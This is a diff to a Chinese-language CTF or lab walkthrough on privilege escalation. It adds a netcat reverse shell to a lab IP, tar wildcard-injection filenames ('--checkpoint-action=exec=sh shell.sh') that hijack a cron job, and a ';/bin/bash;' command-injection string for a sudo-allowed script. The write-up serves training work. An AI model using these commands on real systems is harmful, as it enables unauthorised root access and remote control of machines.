@@ -44,8 +44,42 @@ find / -group developers 2>/dev/null
 看一下backups目录
 ![](vx_images/437083918260225.png)
 解压后是一个相同的html文件
-突然意识到可以
+这里可能是有计划任务
+pspy监听发现
+![](vx_images/470001953384107.png)
+提权方式:tar后面的通配符，tar在打包时如果目录里有特定文件名，可能会被解释成参数，从而执行命令。
+![](vx_images/587542524630305.png)
+
+```
+echo 'nc 192.168.56.101 6666 -e /bin/bash' > shell.sh
+chmod +x shell.sh
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+echo "" > "--checkpoint=1"
+```
+等待计划任务完成
+![](vx_images/289455228922558.png)
+
+尝试sudo -l
+查看文件
+![](vx_images/26984964734016.png)
+
+使用alfobso运行脚本文件,进行命令注入
+![](vx_images/262425880655766.png)
+得到flag
+![](vx_images/69855921284499.png)
 
 
+再次sudo -l
+![](vx_images/499937413548332.png)
+可以任意身份运行文件,查看一下文件
+是乱码
+运行一下,应该是查询用户的信息
+![](vx_images/465444519635114.png)
+猜测与上面的方法一致,尝试命令注入
+```
+;/bin/bash;
+```
+
+![](vx_images/3703668724883.png)
 
 
